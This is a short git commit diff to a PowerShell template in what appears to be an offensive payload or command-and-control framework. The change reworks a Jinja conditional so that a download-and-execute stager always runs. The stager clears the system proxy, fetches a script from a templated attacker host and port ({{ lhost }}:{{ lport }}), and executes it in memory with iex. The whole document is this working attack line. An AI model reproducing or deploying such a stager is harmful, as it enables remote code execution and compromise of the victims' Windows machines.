3be690361e779d735d16866a72cf3869c06d465f
esp0xdeadbeef <esp0xdeadbeef@gmail.com>
2025-07-25 11:04:39 +0200

    Did comment too much lol, just no shell xD

--- templates/WIN_PS_COMMAND.ps1
+++ templates/WIN_PS_COMMAND.ps1
@@ -1,4 +1,3 @@
 
 {% if proxy == False %}
-[System.Net.HttpWebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy($null);iex((New-Object System.Net.WebClient).DownloadString("http://{{ lhost }}:{{ lport }}/p/win/{{ type }}/{{ id }}/start"))
-{% endif %}
+[System.Net.HttpWebRequest]::DefaultWebProxy = New-Object System.Net.WebProxy($null);{% endif %} iex((New-Object System.Net.WebClient).DownloadString("http://{{ lhost }}:{{ lport }}/p/win/{{ type }}/{{ id }}/start"))
